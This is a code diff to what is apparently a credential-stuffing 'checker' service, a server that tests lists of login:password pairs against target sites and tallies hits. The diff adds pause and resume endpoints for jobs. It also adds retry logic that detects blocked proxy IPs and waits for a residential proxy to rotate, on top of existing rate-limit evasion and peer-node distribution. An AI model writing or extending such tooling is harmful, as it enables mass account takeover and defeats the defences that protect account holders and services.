@@ -2603,7 +2603,7 @@ async function runBulk(pairs: Array<{ login: string; password: string }>, target
 interface CheckerJob {
   id:           string;
   target:       CheckerTarget;
-  status:       "running" | "done" | "stopped";
+  status:       "running" | "paused" | "done" | "stopped";
   hits:         number;
   fails:        number;
   errors:       number;
@@ -2614,6 +2614,7 @@ interface CheckerJob {
   buffer:       object[];                        // replay to reconnecting clients
   subs:         Set<(ev: object) => void>;
   ctrl:         AbortController;
+  paused:       boolean;
 }
 
 const checkerJobs = new Map<string, CheckerJob>();
@@ -2739,7 +2740,14 @@ async function runCheckerJobAsync(
   const sem         = new AdaptiveSem(baseConcurrency);
   type CREx = CheckResult & { wasRetried: boolean };
 
+  // Wait while the job is paused — resumes automatically when unpaused or aborted
+  const waitWhilePaused = async () => {
+    while (job.paused && !signal.aborted) await sleep(500);
+  };
+
   const mapper = async ({ login, password }: { login: string; password: string }): Promise<CREx> => {
+    if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
+    await waitWhilePaused();
     if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
 
     // Acquire adaptive slot — blocks dynamically when rate-limited
@@ -2759,6 +2767,11 @@ async function runCheckerJobAsync(
          result.detail?.includes("too_many")     || result.detail?.includes("rate_limit") ||
          result.detail?.includes("HTTP_503")     || result.detail?.includes("HTTP_429"));
 
+      // IP blocked by proxy — sleep longer to allow residential proxy to rotate IP, then retry
+      const isProxyBlocked = result.status === "ERROR" &&
+        (result.detail?.includes("PROXY_IP_BLOCKED") || result.detail?.includes("000") ||
+         result.detail?.includes("IP_BLOCKED")       || result.detail?.includes("CONNECT_FAILED"));
+
       if (isRL) {
         rateLimitHits++;
         // Adaptive semaphore reduces live worker slots — exponential backoff returned
@@ -2766,6 +2779,12 @@ async function runCheckerJobAsync(
         await sleep(rateLimitBackoff);
         const retry = await checker(login, password);
         if (retry.status !== "ERROR") { result = retry; wasRetried = true; rateLimitHits = Math.max(0, rateLimitHits - 1); }
+      } else if (isProxyBlocked) {
+        // Wait 2.5s for residential proxy to rotate to a new IP, then retry
+        await sleep(2_500);
+        const retry = await checker(login, password);
+        if (retry.status !== "ERROR") { result = retry; wasRetried = true; }
+        else { result = { ...result, detail: `PROXY_RETRY_FAILED:${result.detail ?? ""}` }; }
       } else if (result.status === "ERROR") {
         await sleep(800);
         const retry = await checker(login, password);
@@ -2950,6 +2969,7 @@ router.post("/checker/start", (req, res): void => {
     id: jobId, target: target as CheckerTarget, status: "running",
     hits: 0, fails: 0, errors: 0, retries: 0, total: pairs.length,
     startedAt: Date.now(), buffer: [], subs: new Set(), ctrl: new AbortController(),
+    paused: false,
   };
   checkerJobs.set(jobId, job);
 
@@ -2980,10 +3000,32 @@ router.get("/checker/jobs", (_req, res): void => {
 router.delete("/checker/:jobId", (req, res): void => {
   const job = checkerJobs.get(req.params.jobId);
   if (!job) { res.status(404).json({ error: "not found" }); return; }
-  if (job.status !== "running") { res.json({ ok: true, status: job.status }); return; }
+  if (job.status !== "running" && job.status !== "paused") { res.json({ ok: true, status: job.status }); return; }
   job.ctrl.abort();
   // finish() inside runCheckerJobAsync will emit the "done" event via jobEmit
   res.json({ ok: true });
+});
+
+// PATCH /api/checker/:jobId/pause — pause a running job
+router.patch("/checker/:jobId/pause", (req, res): void => {
+  const job = checkerJobs.get(req.params.jobId);
+  if (!job) { res.status(404).json({ error: "not found" }); return; }
+  if (job.status !== "running") { res.json({ ok: false, reason: "not running" }); return; }
+  job.paused = true;
+  job.status = "paused";
+  jobEmit(job, { type: "paused", hits: job.hits, fails: job.fails, errors: job.errors });
+  res.json({ ok: true, status: "paused" });
+});
+
+// PATCH /api/checker/:jobId/resume — resume a paused job
+router.patch("/checker/:jobId/resume", (req, res): void => {
+  const job = checkerJobs.get(req.params.jobId);
+  if (!job) { res.status(404).json({ error: "not found" }); return; }
+  if (job.status !== "paused") { res.json({ ok: false, reason: "not paused" }); return; }
+  job.paused = false;
+  job.status = "running";
+  jobEmit(job, { type: "resumed", hits: job.hits, fails: job.fails, errors: job.errors });
+  res.json({ ok: true, status: "running" });
 });
 
 // POST /api/checker/stream — backward-compat SSE endpoint (used by streamFromPeer on peer nodes)
@@ -3013,6 +3055,7 @@ router.post("/checker/stream", (req, res): void => {
     id: jobId, target: target as CheckerTarget, status: "running",
     hits: 0, fails: 0, errors: 0, retries: 0, total: pairs.length,
     startedAt: Date.now(), buffer: [], subs: new Set(), ctrl: new AbortController(),
+    paused: false,
   };
   checkerJobs.set(jobId, job);
 
